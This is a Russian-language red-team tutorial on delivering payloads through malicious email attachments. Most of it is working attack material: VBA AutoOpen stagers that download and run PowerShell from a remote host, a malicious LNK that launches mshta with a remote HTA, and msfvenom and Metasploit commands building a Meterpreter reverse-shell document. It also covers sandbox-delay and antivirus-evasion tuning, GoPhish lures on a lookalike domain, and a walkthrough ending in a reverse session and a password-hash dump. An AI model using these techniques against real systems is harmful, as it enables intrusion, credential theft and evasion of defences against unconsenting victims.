# Фишинг с вложением как массовый канал доставки payload

## 1. Контекст и разграничения атаки через вредоносные вложения

Фишинг с вложением (malware attachment phishing) — массовая рассылка электронных писем, содержащих вредоносные файлы, с целью доставки и исполнения произвольного кода на целевых системах. В цепочке атаки по модели MITRE ATT&CK данная техника относится к стадии Initial Access (TA0001) с идентификатором [T1566.001 «Spearphishing Attachment»](https://attack.mitre.org/techniques/T1566/001/). Она принципиально отличается от родственных фишинговых приёмов: здесь злоумышленник не стремится украсть учётные данные через подставную страницу, а непосредственно передаёт файл-носитель, который при взаимодействии пользователя приводит к выполнению вредоносного кода — как правило, загрузчика или бэкдора.

Фундаментальное отличие этого канала доставки от фишинга с вредоносными ссылками (T1566.002) в том, что полезная нагрузка размещается непосредственно во вложении письма, минуя необходимость обхода сетевых фильтров URL-репутации и блокировок на уровне веб-прокси. При этом атака может быть как таргетированной (spearphishing), направленной на ограниченный круг лиц, так и массовой, когда одно и то же письмо рассылается тысячам адресатов в расчёте на уровень конверсии открывших.

Следует разграничить несколько пересекающихся, но разных по сути тактик, часто путаемых в рамках понятия «фишинг»:

```text
 Тип фишинга       | Способ доставки      | Основная цель          | Пример артефакта
-------------------|----------------------|------------------------|---------------------------------
 Attachment        | Вложение в письме    | Выполнение кода        | .docm с VBA-макросом
 Link-based        | URL в теле письма    | Сбор учётных данных    | .html-копия страницы входа OWA
 Credential harvest | URL или вложение    | Кража паролей          | JavaScript-форма в PDF
 Smishing          | SMS / мессенджер     | Переход на фишинговый  | URL-сокращатель в SMS
                   |                      | сайт или установка ПО  |
```

Для технического специалиста ключевые признаки фишингового вложения, позволяющего выполнить код, — наличие в письме файла с двойным расширением (`.pdf.exe`), документа с активным содержимым (`docm`, `xlsm`, `pptm`) или архива, содержащего скрипты. Первичный анализ почтового сообщения можно выполнить с помощью встроенных средств работы с MIME:

```bash
# Извлечение и сохранение вложения из EML-файла
munpack phishing.eml
# Определение типа файла
file invoice.docm
```

Вывод команды `file` для вредоносного документа Office, содержащего макросы, покажет:

```
invoice.docm: Microsoft Word 2007+
```

Более детективный анализ на присутствие VBA-макросов даёт утилита `olevba` из семейства [oletools](https://github.com/decalage2/oletools), ставшая стандартом при исследовании вредоносных документов:

```bash
olevba invoice.docm
```

Пример сокращённого вывода, демонстрирующий подозрительные вызовы:

```
+----------+--------------------+-------------------------------------------------+
| Type     | Keyword            | Description                                     |
+----------+--------------------+-------------------------------------------------+
| AutoExec | AutoOpen           | Runs when the Word document is opened           |
| Suspicious| WScript.Shell     | May run a shell command                          |
| Suspicious| Run               | May execute a command/program                    |
| Ioc      | http://192.0.2.10/ | URL reference to potential C2                   |
+----------+--------------------+-------------------------------------------------+
```

Именно разбор MIME-структуры и анализ артефактов вложения являются первым шагом к пониманию того, какой именно механизм задействован для доставки payload, и позволяют корректно выбрать дальнейшую стратегию расследования или пентеста.

## 2. Внутренняя механика вредоносных вложений

Атака через вредоносное вложение реализуется множеством конкретных техник, выбор которых зависит от целевой среды (ОC, версия офисного пакета, наличие антивирусных средств) и желаемой скрытности. Условно все варианты можно классифицировать по типу файла и способу инициации вредоносного кода. Таблица ниже охватывает основные классы вложений, применяемые в реальных кампаниях.

```text
 Тип вложения        | Техника выполнения                       | Пример полезной нагрузки      | Характерные артефакты и IoC
--------------------|------------------------------------------|-------------------------------|---------------------------------------------
 Office с макросом  | VBA-обработчики AutoOpen, Document_Open  | PowerShell-стагер, загрузка   | Заголовки OLE2, streams с именами VBA,
 (.docm, .xlsm)     | запускают shell                          | Meterpreter или Cobalt Strike | вызовы WScript.Shell, Chr-обфускация
 Архив (ZIP, RAR)   | Внутри – LNK, исполняемый файл или ISO   | .lnk → mshta/rundll32         | MOTW отсутствует у файлов из архива,
                    |                                          |                               | командная строка LNK содержит PowerShell
 PDF + JavaScript   | app.launchURL, util.printf, эксплойты    | Загрузка или непосредственный | Старые версии Acrobat Reader,
                    |                                          | вызов cmd.exe                 | CVE-2013-2729, наличие /JS, /JavaScript
 HTML Application   | mshta.exe file.hta; .vbs, .js            | Скрипт-загрузчик             | Файлы .hta, .vbe, .wsf, JScript-вызовы
 (.hta, .vbs, .js)  |                                          |                               | WScript.Network, ADODB.Stream
 ISO / VHD          | Смонтированный образ содержит скрытые    | LNK-файлы внутри образа       | Отсутствие Mark-of-the-Web на файлах,
                    | исполняемые файлы                        |                               | файловая система CDFS, запуск через проводник
```

Наиболее распространённым и стабильно работающим остаётся класс документов Microsoft Office с внедрёнными макросами на языке VBA (Visual Basic for Applications). Макросы хранятся в OLE Structured Storage (Compound File Binary) в виде потоков с определёнными именами. При открытии документа, если макросы разрешены или пользователь нажимает «Включить содержимое», автоматически выполняются специальные процедуры, такие как `AutoOpen()`, `Document_Open()`, `Workbook_Open()`. Код макроса, как правило, использует COM-объект `WScript.Shell` для запуска системной оболочки.

Классический необфусцированный макрос-стагер выглядит так:

```vba
Sub AutoOpen()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell -NoP -Exec Bypass -C ""IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/ps.ps1')""", 0, False
End Sub
```

Этот код незамедлительно загружает PowerShell-скрипт со внешнего сервера и выполняет его в скрытом окне. Современные вредоносные кампании почти всегда прибегают к многоступенчатой обфускации, чтобы обойти статический анализ и AMSI (Antimalware Scan Interface). Типичный подход — разбиение строк с помощью функции `ChrW`, конкатенация фрагментов или применение обратного Base64:

```vba
Function DecodeBase64(ByVal s As String) As String
    Dim b() As Byte
    b = DecodeBase64Byte(CStr(s))
    DecodeBase64 = StrConv(b, vbUnicode)
End Function
```

В более изощрённых вариантах используются API-вызовы для обхода AMSI, например патчинг функции `AmsiScanBuffer` в оперативной памяти процесса. Упрощённый PoC такого обхода на VBA требует загрузки небольшого шелл-кода через `VirtualAlloc`/`RtlMoveMemory`, но детальный разбор выходит за рамки введения; достаточно понимать, что макрос-движок способен взаимодействовать с WinAPI через динамически определяемые адреса.

Другой активно эксплуатируемый вектор — архивы, содержащие LNK-файлы. Файл ярлыка Windows имеет структуру, в которой поле `CommandLineArguments` позволяет указать любые параметры запуска. Злоумышленник создаёт LNK-ссылку, целевому пути которой назначается `%windir%\System32\mshta.exe`, а в аргументах передаётся URL вредоносного HTA:

```powershell
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\Desktop\Invoice.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\mshta.exe"
$Shortcut.Arguments = "http://192.0.2.10/malicious.hta"
$Shortcut.IconLocation = "%ProgramFiles%\Windows Mail\wab.exe, 0"
$Shortcut.Save()
```

Такая конструкция, помещённая в архив, при извлечении и двойном клике приведёт к запуску mshta с загрузкой HTA-скрипта, обходя многие фильтры по содержимому письма. Иногда payload в виде исполняемого файла размещается прямо в ISO-образе, который пользователь монтирует двойным щелчком мыши. Поскольку файлы внутри образа не получают атрибут зоны загрузки (Mark-of-the-Web), они могут запускаться без предупреждений SmartScreen, что снижает порог успешной атаки.

## 3. Инструментарий и практические методики доставки

В арсенале пентестера фишинг с вложением реализуется через цепочку инструментов, обеспечивающих генерацию полезной нагрузки, её внедрение в формат-носитель, обход средств защиты и управляемый канал взаимодействия. Общая последовательность действий выглядит так:

1. **Создание пейлоада** — формирование шелл-кода или промежуточного загрузчика.
2. **Упаковка в документ** — внедрение кода в тело офисного файла или сборка исполняемого артефакта.
3. **Обход защит** — обфускация, шифрование, использование легитимных системных утилит (LotL).
4. **Построение инфраструктуры** — поднятие сервера управления, настройка redirector’ов, доменов-двойников.
5. **Рассылка** — автоматизация отправки писем с отслеживанием событий.
6. **Перехват сессии** — получение обратного соединения на C2-сервер.

Одним из основных генераторов пейлоадов в сообществе является [Metasploit Framework](https://github.com/rapid7/metasploit-framework) и его утилита `msfvenom`. Для задачи доставки через документ Office наиболее удобна конвертация Meterpreter-пейлоада в формат VBA:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.0.2.10 LPORT=443 -f vba
```

Вывод будет содержать массив байт, оформленный для вставки в макрос:

```
Sub AutoOpen()
    Dim shellcode As Variant
    shellcode = Array(252, 232, 130, ... ) ' несколько сотен байт
    ' Далее следует логика аллокации памяти и запуска
End Sub
```

На практике, однако, чаще используют связку из модуля Metasploit `office_word_macro`, который генерирует готовый документ с уже встроенным обфусцированным макросом, использующим PowerShell в качестве промежуточного звена:

```bash
msf6 > use exploit/multi/fileformat/office_word_macro
msf6 exploit(office_word_macro) > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 exploit(office_word_macro) > set LHOST 192.0.2.10
msf6 exploit(office_word_macro) > set LPORT 443
msf6 exploit(office_word_macro) > set FILENAME invoice.docm
msf6 exploit(office_word_macro) > run
[*] Writing 31746 bytes to invoice.docm...
[+] invoice.docm stored at /root/.msf4/local/invoice.docm
```

Сгенерированный документ уже содержит приёмы обхода AMSI и базовую обфускацию. Тем не менее, для реальных тестирований уровня «повышенная скрытность» потребуется дополнительная доработка макроса вручную либо применение коммерческих фреймворков вроде [Cobalt Strike](https://www.cobaltstrike.com/), предоставляющих гибкие средства пакетной генерации артефактов.

При использовании документов важна кастомизация не только самого макроса, но и его закрепление в определённом контексте файла. Например, через COM-объекты Word можно программно вставить текст-приманку, призывающий включить макросы. Это делается скриптом PowerShell:

```powershell
$word = New-Object -ComObject Word.Application
$doc = $word.Documents.Open("C:\payload\invoice.docm")
$selection = $word.Selection
$selection.TypeText("This document is protected. Enable content to view the invoice.")
$doc.Save()
$doc.Close()
$word.Quit()
```

Для массовой рассылки стандартом де-факто стал [GoPhish](https://getgophish.com/) — опенсорсный фреймворк для фишинговых симуляций. Он позволяет создавать шаблоны писем, управлять лендинговыми страницами и отслеживать клики. Конфигурация шаблона с вложением описывается в JSON-формате, где поле `attachments` содержит массив вложений с указанием имени и содержимого в Base64. Упрощённая иллюстративная схема такого конфига:

```json
{
  "name": "Invoice Reminder",
  "subject": "Invoice #INV-2025-0471",
  "attachments": [
    {
      "name": "Invoice.zip",
      "content": "UEsDBBQAAAAIAAAAAP9ZVlN...",
      "type": "application/zip"
    }
  ],
  "html": "<html><body><p>Dear user, your invoice is attached.</p></body></html>"
}
```

Пентестеру также необходимо обеспечить прохождение антиспам-фильтров. Для этого используются методы прогрева репутации отправителя: отправка сначала легитимных писем, настройка SPF/DKIM/DMARC для домена-двойника, обход песочниц путём задержек выполнения макроса (например, спящий цикл на минуту после открытия). В VBA-макросе задержка реализуется просто:

```vba
Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal ms As LongPtr)
Sub Document_Open()
    Sleep 300000 ' 5 минут сна перед выполнением
    Call MainPayload
End Sub
```

При анализе созданного артефакта на предмет детектирования популярными антивирусными движками неоценим сервис [VirusTotal](https://www.virustotal.com/) (при соблюдении политики конфиденциальности). Командная обвязка с помощью API может быть интегрирована в пайплайн подготовки:

```bash
curl -F "file=@invoice.docm" https://www.virustotal.com/api/v3/files -H "x-apikey: <KEY>"
```

Полученный JSON-ответ позволит быстро оценить, какие вендоры определяют файл как вредоносный, и доработать обфускацию.

Когда все звенья цепочки настроены, пентестер переходит к финальному этапу — запуску слушателя обратных соединений и мониторингу входящих Meterpreter-сессий или биконов Cobalt Strike.

## 4. Сквозной практический пример: имитация целевой фишинг-кампании через вредоносный Excel-документ

### Исходные условия

Пентестер выполняет имитацию атаки в рамках red team-проекта для компании, использующей Windows 10 Enterprise 22H2 с Microsoft Defender в стандартной конфигурации. Согласован домен-двойник `acc0unting.com` (оригинал `accounting.com`). Цель — доставить агент Meterpreter на рабочую станцию сотрудницы бухгалтерии, получив тем самым точку опоры во внутренней сети. Слушатель будет развёрнут на VPS с адресом `192.0.2.10:443` (HTTPS для обхода сетевых сигнатур).

### Шаг 1: Генерация вредоносного Excel-документа с макросом

Используется модуль `office_word_macro`, цель — формат Excel 2007+ (xlsm). Выбран пейлоад `windows/x64/meterpreter/reverse_https` для маскировки трафика под обычный веб-серфинг.

```bash
msf6 > use exploit/multi/fileformat/office_word_macro
msf6 exploit(office_word_macro) > set FILENAME invoice_april.xlsm
msf6 exploit(office_word_macro) > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 exploit(office_word_macro) > set LHOST 192.0.2.10
msf6 exploit(office_word_macro) > set LPORT 443
msf6 exploit(office_word_macro) > set TARGET_EXCEL 1
msf6 exploit(office_word_macro) > run
[*] Using template: /usr/share/metasploit-framework/data/templates/office/excel.xlsx
[+] invoice_april.xlsm stored at /root/.msf4/local/invoice_april.xlsm
```

Сгенерированный файл содержит макрос `Workbook_Open()`, который выполнит полезную нагрузку при открытии книги.

### Шаг 2: Упаковка и доставка

Для обхода базовых проверок антивируса на шлюзе документ помещается в защищённый паролем ZIP-архив. Пароль указывается в теле письма, что заставляет пользователя вручную вводить его и снижает вероятность автоматической разблокировки песочницей.

```bash
zip -e -P Qwe123 invoice.zip invoice_april.xlsm
```

В GoPhish создаётся кампания с отправителем `noreply@acc0unting.com`. Шаблон письма формируется привлекательным текстом на тему срочной оплаты с вложением `invoice.zip`. Фрагмент JSON определения кампании:

```json
{
  "name": "April Invoices",
  "template": {
    "subject": "Urgent: April Invoice Payment",
    "html": "<p>Dear Sir/Madam,</p><p>Please find attached your invoice for April. Password for archive is <b>Qwe123</b>.</p>"
  },
  "url": "https://acc0unting.com/invoice",
  "smtp": {
    "host": "smtp.sendgrid.net:587",
    "from_address": "noreply@acc0unting.com"
  }
}
```

После настройки запускается отправка по списку из 20 целевых адресов. Система логирует доставку:

```text
time=2025-01-15T09:05:01Z campaign_id=1 email=alice.smith@target.com status=Success
```

### Шаг 3: Открытие документа жертвой и выполнение макроса

Сотрудница получает письмо, загружает архив, извлекает документ и открывает его в Excel. При открытии появляется стандартное предупреждение о макросах:

```text
SECURITY WARNING   Macros have been disabled.  [Enable Content]
```

Предполагая, что это корпоративный защищённый документ, пользователь нажимает «Enable Content». Макрос `Workbook_Open()` немедленно создаёт экземпляр `WScript.Shell` и выполняет встроенную обфусцированную команду PowerShell, которая загружает и запускает Meterpreter-полезную нагрузку. Фактическая команда, генерируемая модулем, скрыта, но её суть — вызов `powershell -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://192.0.2.10/updates')"`.

### Шаг 4: Подтверждение обратного соединения на C2-сервере

На контролируемой VPS заблаговременно поднят слушатель Meterpreter:

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > run
[*] Started HTTPS reverse handler on https://0.0.0.0:443
```

Через несколько минут после рассылки появляется входящая сессия:

```text
[*] https://192.0.2.10:443 handling request from 203.0.113.25; (UUID: xyz123) Encoded stage...
[*] Meterpreter session 1 opened (192.0.2.10:443 -> 203.0.113.25:58234) at 2025-01-15 09:15:36 +0000
```

Проверка активных сессий:

```bash
msf6 exploit(multi/handler) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                Connection
  --  ----  -----------------------  -------------------------  -------------------------------
  1         meterpreter x64/windows  TARGET\alice.smith @ HR-WS-12  192.0.2.10:443 -> 203.0.113.25:58234 (203.0.113.25)
```

### Шаг 5: Демонстрация начального доступа (пост-эксплуатация)

Теперь пентестер взаимодействует с сессией и выполняет сбор первичной информации, демонстрируя полный контроль.

```bash
msf6 > sessions -i 1
meterpreter > sysinfo
Computer        : HR-WS-12
OS              : Windows 10 (Build 19045).
Architecture    : x64
System Language : en_US
Domain          : TARGET
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
alice.smith:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

### Ожидаемый вывод

Данный практический пример демонстрирует полный цикл проведения массовой доставки полезной нагрузки через фишинговое вложение — от генерации защищённого артефакта и рассылки до получения полного интерактивного доступа к рабочей станции пользователя. Сквозная иллюстрация подтверждает, что документы Office с макросами остаются эффективным каналом начального проникновения, особенно когда сочетаются с методами социальной инженерии и обхода базовых защитных фильтров.

## Источники

- [MITRE ATT&CK – T1566.001 Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)
- [oletools – Python tools to analyze OLE and MS Office files](https://github.com/decalage2/oletools)
- [Metasploit Framework documentation](https://github.com/rapid7/metasploit-framework)
- [GoPhish – Open-Source Phishing Toolkit](https://getgophish.com/)
- [Microsoft VBA language reference](https://docs.microsoft.com/en-us/office/vba/api/overview/)
- [VirusTotal API v3](https://developers.virustotal.com/reference/overview)